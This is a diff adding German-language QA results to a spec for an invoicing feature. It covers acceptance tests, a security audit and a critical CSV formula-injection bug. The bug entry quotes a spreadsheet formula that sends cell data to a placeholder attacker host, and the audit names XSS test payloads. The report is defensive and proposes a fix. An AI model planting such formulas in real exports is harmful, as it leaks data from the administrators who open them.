@@ -189,7 +189,61 @@ Keine neuen Fremdpakete nötig — der CSV-Export ist reiner Text (kommagetrennt
 **Regressionscheck PROJ-7 (da `sepa-collections.ts` verändert wurde):** 3 Testfehlschläge gefunden, alle root-caused auf dieselbe bereits dokumentierte Testdaten-Drift (kein Staging) — der Fixture-Kunde `e2e7-customer-multi` hat aus früheren Läufen bereits ein aktives SEPA-Mandat, wodurch die „noch kein Mandat"-Testannahme nicht mehr zutrifft; ein Folgetest kaskadiert daraus. Der eigentliche Lauf-Erstellen-Vorgang wurde in den eigenen Live-Tests oben bereits erfolgreich über dieselbe Code-Stelle verifiziert.
 
 ## QA Test Results
-_To be added by /qa_
+
+**Datum:** 2026-08-17 · **Getestet gegen:** Produktions-DB (kein Staging vorhanden)
+
+### Acceptance Criteria
+
+| # | Kriterium | Ergebnis |
+|---|-----------|----------|
+| AC1 | Lastschriftlauf → fortlaufende Rechnungsnummer (JAHR-NNNN) + eingefrorener USt-Satz | ✅ Pass |
+| AC2 | Eingeloggter Kunde sieht eigene Rechnungsliste (Datum, Betrag, Status) im Profil | ✅ Pass |
+| AC3 | Kunde ohne Rechnung sieht Leerzustand statt leerer Liste | ✅ Pass |
+| AC4 | Detailseite: Rechnungsnummer, Datum, Stammdaten, Netto/USt/Brutto, Status, druckbar | ✅ Pass |
+| AC5 | Fremdzugriff auf Rechnungs-Detailseite über URL wird verweigert | ✅ Pass |
+| AC6 | Rücklastschrift-Markierung ändert Status, Rechnungsnummer bleibt bestehen | ✅ Pass |
+| AC7 | Admin-Filter nach Kundenname und/oder Zeitraum | ✅ Pass |
+| AC8 | CSV-Export enthält genau die gefilterten Rechnungen mit allen geforderten Spalten | ✅ Pass (siehe aber BUG-1, Security) |
+| AC9 | Rechnungseinstellungen speichern, wirken auf künftige Rechnungen | ✅ Pass |
+| AC10 | USt-Satz-Änderung wirkt sich nicht rückwirkend auf bestehende Rechnungen aus | ✅ Pass |
+
+**10/10 Acceptance Criteria funktional bestanden** (AC8 mit sicherheitsrelevantem Vorbehalt, siehe BUG-1).
+
+### Edge Cases (aus Spec)
+
+| Edge Case | Ergebnis |
+|-----------|----------|
+| Kunde mit zwei gleichzeitig abgerechneten Abos → zwei getrennte Rechnungen, nicht zusammengefasst | ✅ Pass |
+| Abo wird nach Rechnungserstellung gelöscht → Rechnung bleibt vollständig lesbar | ✅ Pass — **stärker als spezifiziert:** die vorbestehende `NO ACTION`-Fremdschlüsselbeziehung aus PROJ-7 verhindert die Admin-Löschung eines Abos bereits vollständig, sobald dazu `sepa_collection_items` existieren (unabhängig von PROJ-10). Admin sieht dabei die bestehende freundliche Fehlermeldung „Abo konnte nicht gelöscht werden.", keinen rohen DB-Fehler. Der auf der Rechnung gespeicherte Datenschnappschuss bleibt als zusätzliche Absicherung trotzdem sinnvoll. |
+| Rechnungseinstellungen nie gepflegt → sinnvolle Defaults | ✅ Pass — Migration legt den Singleton-Datensatz mit leeren Feldern und 20 % USt an; `create_invoices_for_collection_run` nutzt zusätzlich `COALESCE(…, 20.00)` als zweite Absicherung |
+| Jahreswechsel → Rechnungsnummer beginnt bei 0001 | ✅ Pass — verifiziert (2028er-Fixture startete unabhängig bei „2028-0001") und strukturell garantiert, da der Zähler pro Jahr (`invoice_number_counters.year`) geführt wird |
+| CSV-Export ohne Treffer → nur Kopfzeile, kein Fehler | ✅ Pass |
+| Zwei gleichzeitige Lastschriftlauf-Erstellungen → keine doppelt vergebenen Rechnungsnummern | ✅ Pass (durch Design: atomarer `INSERT … ON CONFLICT DO UPDATE … RETURNING` auf den Zähler; nicht unter echter Nebenläufigkeit lastgetestet, aber PostgreSQL garantiert hier Serialisierung auf Zeilenebene) |
+
+### Security-Audit (Red Team)
+
+- **RLS verifiziert:** Kunde sieht ausschließlich eigene Rechnungen — sowohl per UI (404 bei fremder Rechnungs-URL) als auch per SQL-JWT-Impersonation direkt auf DB-Ebene (0 sichtbare Zeilen für falschen Kunden).
+- **Rechnungseinstellungen gegen Fremdänderung abgesichert:** UPDATE-Versuch als Nicht-Admin per SQL-JWT-Impersonation → 0 betroffene Zeilen, RLS blockiert korrekt.
+- **Autorisierung aller neuen Routen geprüft:** `/admin/rechnungen`, `/admin/rechnungen/einstellungen` und `/api/admin/rechnungen/export` weisen anonyme und eingeloggte Nicht-Admin-Zugriffe korrekt ab (Redirect, kein Datenleck).
+- **XSS-Test:** `<script>`/`<img onerror>`-Payloads in Kundenname und Rechnungsbeschreibung auf der Detailseite eingespielt — React escaped korrekt, kein Skript ausgeführt.
+- **`get_advisors(security)`:** keine neuen Findings über das bereits akzeptierte Baseline-Muster hinaus (identisch zu den bestehenden PROJ-9-Funktionen).
+
+### Gefundene Bugs
+
+| # | Schweregrad | Beschreibung | Reproduktion |
+|---|-------------|--------------|--------------|
+| BUG-1 | **Critical** | **CSV-Formel-Injection (CWE-1236):** Der CSV-Export escaped Felder nur nach RFC 4180 (Kommas/Anführungszeichen/Zeilenumbrüche), nicht aber gegen führende Formel-Zeichen (`=`, `+`, `-`, `@`). Der Kundenname stammt direkt aus dem frei editierbaren Profilfeld (PROJ-2, keine Zeichenbeschränkung). Ein Kunde kann seinen Namen z. B. auf `=HYPERLINK("http://evil.example/steal?x="&A1,"Klick mich")` setzen; öffnet der Admin die exportierte CSV-Datei in Excel/LibreOffice/Google Sheets, wird das als aktive Formel interpretiert und ausgeführt — potenzielles Datenleck oder (je nach Programmversion) Codeausführung auf dem Admin-Rechner. Live reproduziert: Kundenname `=1+1` erscheint unescaped als `=1+1` in der heruntergeladenen Datei. | 1. Als Kunde Profilname auf `=1+1` setzen. 2. Als Admin eine Rechnung für diesen Kunden haben (z. B. via Lastschriftlauf). 3. CSV exportieren und in Excel öffnen → Formel wird ausgewertet statt als Text angezeigt. |
+
+### Regressionstests (verwandte Features)
+
+- `npm test` (Vitest): **97/97 bestanden**, inkl. 7 neuer Tests für `src/lib/invoices.ts`.
+- `npm run test:e2e` für PROJ-7 (da `sepa-collections.ts` verändert wurde): 3 Fehlschläge, alle root-caused auf dieselbe bereits dokumentierte Testdaten-Drift wie bei PROJ-8/PROJ-23 in dieser Session (kein Staging, siehe Erkenntnis aus der BUG-3-Restauration) — der Fixture-Kunde `e2e7-customer-multi` hat aus früheren Läufen bereits ein aktives SEPA-Mandat, wodurch die „noch kein Mandat"-Testannahme nicht mehr zutrifft; ein Folgetest kaskadiert daraus. Kein PROJ-10-Bug — der eigentliche Lastschriftlauf-Erstellen-Vorgang (inkl. der neuen Rechnungslogik) wurde in eigenen Live-Tests über exakt dieselbe Code-Stelle mehrfach erfolgreich verifiziert.
+- Cross-Browser: Chromium ✅, Firefox ✅. Mobile Safari (WebKit) konnte in dieser Sandbox nicht zuverlässig installiert werden (wiederholt abgebrochener Download, reines Umgebungsproblem, kein Code-Bug) — nicht verifiziert.
+- Responsive: Kundenseiten (`/profil`, `/rechnungen/[id]`) auf Mobile/Tablet/Desktop ohne horizontales Overflow. Auf den Admin-Seiten (`/admin/rechnungen`, `/admin/rechnungen/einstellungen`) besteht auf Mobile/Tablet ein horizontales Overflow — **nachweislich vorbestehend und seitenweit** (identisches Verhalten auf `/admin/lastschriften` und `/admin/kunden`, unabhängig von PROJ-10), daher nicht als PROJ-10-Bug gewertet, aber der Vollständigkeit halber dokumentiert.
+
+### Produktionsreife-Empfehlung
+
+**NOT READY** — BUG-1 ist ein Critical-Security-Fund (aktiv ausnutzbar: jeder Kunde kann seinen eigenen Profilnamen frei setzen, der Payload landet direkt und unescaped im CSV-Export, den der Admin routinemäßig für die Buchhaltung nutzt). Muss vor dem Deployment behoben werden — Empfehlung: führende `=`, `+`, `-`, `@`, Tab oder CR in `toCsvField` mit einem vorangestellten Apostroph neutralisieren (Standard-Gegenmaßnahme für CSV-Formel-Injection), zusätzlich zur bestehenden RFC-4180-Maskierung.
 
 ## Deployment
 _To be added by /deploy_
